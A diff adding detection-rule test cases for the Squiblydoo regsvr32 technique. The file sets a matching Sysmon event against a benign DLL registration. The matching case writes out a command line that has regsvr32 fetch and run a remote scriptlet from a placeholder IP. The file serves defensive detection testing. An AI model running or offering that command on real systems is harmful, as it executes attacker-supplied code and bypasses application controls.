@@ -1,0 +1,17 @@
+rule: regsvr32_squiblydoo.yml
+cases:
+  - name:   scriptlet from a URL
+    expect: match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      Image:       C:\Windows\System32\regsvr32.exe
+      CommandLine: regsvr32.exe /s /n /u /i:http://198.51.100.7/file.sct scrobj.dll
+
+  - name:   ordinary dll registration
+    expect: no-match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      Image:       C:\Windows\System32\regsvr32.exe
+      CommandLine: regsvr32.exe /s C:\Program Files\Vendor\plugin.dll
